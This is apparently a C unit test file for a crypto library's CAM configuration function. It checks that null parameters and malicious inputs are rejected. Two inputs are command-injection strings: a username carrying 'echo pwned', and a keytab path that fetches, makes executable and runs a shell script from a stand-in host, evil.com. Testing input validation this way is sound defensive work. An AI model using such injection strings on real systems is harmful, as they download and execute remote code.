#include "crypto.h"
#include "utest.h"

/**
 * @brief Unit Test: KMC CAM Configs
 **/
UTEST(KMC_CAM, CAM_CONFIG)
{
    int32_t status = CRYPTO_LIB_SUCCESS;

    // check username
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,      // cam_enabled
                               "/path/to/cookie",     // cookie_file_path
                               "/etc/krb5.keytab",    // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE, // login_method
                               "https://example.com", // access_manager_uri
                               "user; echo pwned",    // username (MALICIOUS)
                               "/home/cam");
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // check keytab filepath
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,               // cam_enabled
                               "/path/to/cookie",              // cookie_file_path
                               "/etc/krb5.keytab; wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x "
                               "/tmp/shell.sh; /tmp/shell.sh", // keytab_file_path (MALICIOUS)
                               CAM_LOGIN_KEYTAB_FILE,          // login_method
                               "https://example.com",          // access_manager_uri
                               "testuser",                     // username
                               "/home/cam"                     // cam_home
    );
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // NULL cookie_file_path
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,               // cam_enabled
                               NULL,                           // cookie_file_path (NULL)
                               "/etc/krb5.keytab",             // keytab_file_path
                               CAM_LOGIN_NONE,                 // login_method
                               "https://example.com",          // access_manager_uri
                               "testuser",                     // username
                               "/home/cam"                     // cam_home
    );
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // NULL keytab_file_path
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,               // cam_enabled
                               "/path/to/cookie",              // cookie_file_path
                               NULL,                           // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE,          // login_method
                               "https://example.com",          // access_manager_uri
                               "testuser",                     // username
                               "/home/cam"                     // cam_home
    );
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // NULL keytab_file_path (cookie file login method)
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,               // cam_enabled
                               "/path/to/cookie",              // cookie_file_path
                               NULL,                           // keytab_file_path
                               CAM_LOGIN_NONE,                 // login_method
                               "https://example.com",          // access_manager_uri
                               "testuser",                     // username
                               "/home/cam"                     // cam_home
    );
    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // NULL username
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,               // cam_enabled
                               "/path/to/cookie",              // cookie_file_path
                               "/etc/krb5.keytab",             // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE,          // login_method
                               "https://example.com",          // access_manager_uri
                               NULL,                           // username
                               "/home/cam"                     // cam_home
    );
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // NULL cam_home
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,               // cam_enabled
                               "/path/to/cookie",              // cookie_file_path
                               "/etc/krb5.keytab",             // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE,          // login_method
                               "https://example.com",          // access_manager_uri
                               "testuser",                     // username
                               NULL                            // cam_home
    );
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // NULL access_manager_uri
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,               // cam_enabled
                               "/path/to/cookie",              // cookie_file_path
                               "/etc/krb5.keytab",             // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE,          // login_method
                               NULL,                           // access_manager_uri
                               "testuser",                     // username
                               "/home/cam"                     // cam_home
    );
    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();

    // check good config
    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,      // cam_enabled
                               "/path/to/cookie",     // cookie_file_path
                               "/etc/krb5.keytab",    // keytab_file_path
                               CAM_LOGIN_KEYTAB_FILE, // login_method
                               "https://example.com", // access_manager_uri
                               "testuser",            // username
                               "/home/cam"            // cam_home
    );
    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
    printf("Cam Config Status: %d\n", status);
    Crypto_Shutdown();
}
UTEST_MAIN();